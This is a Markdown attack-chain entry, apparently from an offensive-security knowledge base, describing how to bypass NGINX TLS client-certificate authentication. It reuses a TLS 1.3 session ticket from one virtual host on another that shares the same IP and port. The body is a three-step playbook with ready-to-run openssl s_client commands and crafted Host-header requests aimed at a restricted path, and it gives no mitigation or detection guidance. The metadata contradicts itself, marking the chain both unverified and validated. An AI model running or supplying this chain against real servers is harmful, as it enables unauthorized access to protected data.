---
tags:
  - nginx
  - tls
  - openssl
  - auth-bypass
  - session-ticket
  - virtual-host
type: attack_chain
tools:
  - '[[tools/OpenSSL]]'
tactics:
  - '[[Initial Access]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Establish-Authenticated-TLS-Session-with-Virtual-Host-A]]'
  - '[[procedures/Resume-TLS-Session-on-Virtual-Host-B-Using-Ticket-from-A]]'
  - '[[procedures/Access-Restricted-Content-on-Host-B]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:31:31.112Z'
description: >-
  Exploit shared TLS session tickets in NGINX configurations with multiple
  virtual hosts to bypass client certificate authentication on protected
  resources.
skill_level: intermediate
impact_level: high
id: bdaa5a43-e1bc-4af0-9f1a-f783ffce0525
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Valid Accounts]]'
---
# Bypass TLS Client Certificate Authentication in NGINX via Session Ticket Resumption

Multi-stage attack chain demonstrating a complete attack workflow exploiting NGINX's lack of isolation for TLS session tickets between virtual hosts sharing the same IP and port in TLS 1.3 with OpenSSL.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Establish Authenticated Session on Host A] --> B[Resume Session on Host B]
    B --> C[Access Restricted Resources on B]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/OpenSSL]]

### Target Environment

- NGINX web server with TLS 1.3 and OpenSSL
- Multiple name-based virtual hosts sharing IP/port
- TLS session tickets or SSL session cache enabled on default server
- Client certificate authentication required on at least one host

### Initial Access Requirements

- Valid client certificate for the first virtual host (A)
- Network access to the target's IP/port (e.g., 443)
- Ability to perform TLS handshakes

## Detailed Attack Procedures

### Step 1: Establish Authenticated TLS Session with Virtual Host A
procedure: [[procedures/Establish-Authenticated-TLS-Session-with-Virtual-Host-A]]

**Objective**: Perform a full TLS handshake with host A using a valid client certificate to obtain a session ticket.

**Instructions**: Use [[commands/openssl-s-client-auth-handshake]] to connect to host A and complete the authentication:

```bash
openssl s_client -connect hostA.example.com:443 -cert client.crt -key client.key -tls1_3 -servername hostA.example.com
```

Capture the session ticket from the output (look for NewSessionTicket messages). Save the session for resumption.

**Expected Output**: Successful TLS handshake with session ticket issued.

**Success Indicators**:
- Handshake completes without errors
- Session ticket received in TLS messages

### Step 2: Resume TLS Session on Virtual Host B Using Ticket from A
procedure: [[procedures/Resume-TLS-Session-on-Virtual-Host-B-Using-Ticket-from-A]]

**Objective**: Resume the session from host A on host B by manipulating SNI and using the HTTP Host header to target B, bypassing re-authentication.

**Instructions**: Use [[commands/openssl-s-client-session-resume]] with the saved session ticket, setting SNI to host A (or omitting it) and specifying Host: hostB.example.com in the HTTP request:

```bash
openssl s_client -connect shared-ip:443 -tls1_3 -servername hostA.example.com -sess_in session_from_A.pem -sess_out resumed_session.pem
```

Then send an HTTP request over the resumed connection:

```bash
printf "GET / HTTP/1.1\r\nHost: hostB.example.com\r\n\r\n" | openssl s_client -connect shared-ip:443 -tls1_3 -servername hostA.example.com -sess_in session_from_A.pem
```

**Expected Output**: TLS resumption succeeds without client certificate prompt; HTTP response from host B.

**Success Indicators**:
- Resumed handshake completes
- Access to host B without re-authenticating

### Step 3: Access Restricted Content on Host B
procedure: [[procedures/Access-Restricted-Content-on-Host-B]]

**Objective**: Use the resumed session to send requests to restricted endpoints on host B, exploiting the lack of ticket isolation.

**Instructions**: Over the resumed TLS connection, send requests targeting host B's protected paths using the HTTP Host header:

```bash
printf "GET /restricted HTTP/1.1\r\nHost: hostB.example.com\r\n\r\n" | openssl s_client -connect shared-ip:443 -tls1_3 -servername hostA.example.com -sess_in resumed_session.pem
```

Repeat for additional resources.

**Expected Output**: Unauthorized access to restricted content on host B.

**Success Indicators**:
- Retrieval of protected data
- No client certificate challenge

## Attack Chain Summary

### Key Achievements

1. Obtained session ticket from authenticated host A
2. Resumed ticket on host B without re-authentication
3. Gained unauthorized access to restricted resources on host B

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Valid Accounts]]

### MITRE ATT&CK Tactics

- [[Initial Access]]

---
*Last updated: 2023-10-01T00:00:00Z*
